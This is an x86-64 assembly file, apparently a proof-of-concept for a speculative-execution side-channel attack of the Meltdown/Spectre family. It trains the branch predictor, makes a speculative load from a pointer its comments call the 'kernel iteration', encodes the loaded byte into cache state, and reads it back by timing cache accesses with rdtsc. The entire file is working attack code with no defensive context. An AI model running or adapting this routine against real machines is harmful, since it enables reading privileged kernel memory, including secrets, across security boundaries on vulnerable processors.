.code

; by @pwnallthethings

EXTRN   pointers:QWORD
EXTRN   speculative:QWORD
EXTRN	L2_cache_clear:QWORD
EXTRN	times:QWORD

_run_attempt	PROC PUBLIC
	push rdi
	push rbx
	push r8		; &speculative[i]
	push r9		; &pointers[i]
	push r10	; count
	push r11
	push r13	; times
	push r15	; pointers[i]

	mov r10, 2048
	lea r8, pointers
	mov r9, qword ptr [speculative]
	lea r13, times

_loop:
	mov r15, qword ptr [r8]	; next pointer

	; cache invalidate:
	mov rdi, qword ptr [L2_cache_clear]
	mov rcx, ((256 * 4096) / 64)
_cache_invalidate_loop:
	inc qword ptr [rdi];
	add rdi, 64
	dec rcx
	jnz _cache_invalidate_loop

	sub rdi, (256 * 4096)
	xor rax, rax
	mfence

	mov rdx, qword ptr [r9]							; next pointer is speculative?
	test rdx, rdx									; if RDX is zero, we want to run this iteration speculatively.
	jnz _speculative_correction						; we rig the predictor to assume this is never taken

; this is run for real on all the boring iterations, but run speculatively on the kernel iteration

	mov al, byte ptr [r15]							; load the value at the pointer
	shl rax, 6
	lea rdi, qword ptr [rdi + rax]
	clflush [rdi]						; do a dependent load and store

_loop_iter:
	cmp r10, (2048-999)
	jne _nobreak
;	int 3
_nobreak:
	cmp r10, (2048-1000)
	je _speculative_correction

	add r9, 8
	add r8, 8
	dec r10
	jnz _loop

_end_of_function:
	pop r15
	pop r13
	pop r11
	pop r10
	pop r9
	pop r8
	pop rbx
	pop rdi
	ret



_speculative_correction:
	; at this point:
	; r13 = &times[0]
	; rdi = &L2_cache_clear[0]
	; everything else = scratch

	mov r9, 256
	xor r8, r8
_speculative_timing_loop:
	mfence

	; time -> R11
	rdtsc
	shl rdx, 32
	xor rdx, rax
	mov r11, rdx

	; do the read
	mov rax, r8
	shl rax, 6
	inc qword ptr [rdi + rax]
	mfence

	; time_start - time_end -> RDX
	rdtsc
	shl rdx, 32
	xor rdx, rax
	sub rdx, r11

	mov qword ptr [r13], rdx

	; iterate:
	inc r8
	add r13, 8
	dec r9
	jnz _speculative_timing_loop


	jmp _end_of_function


_run_attempt	ENDP

END
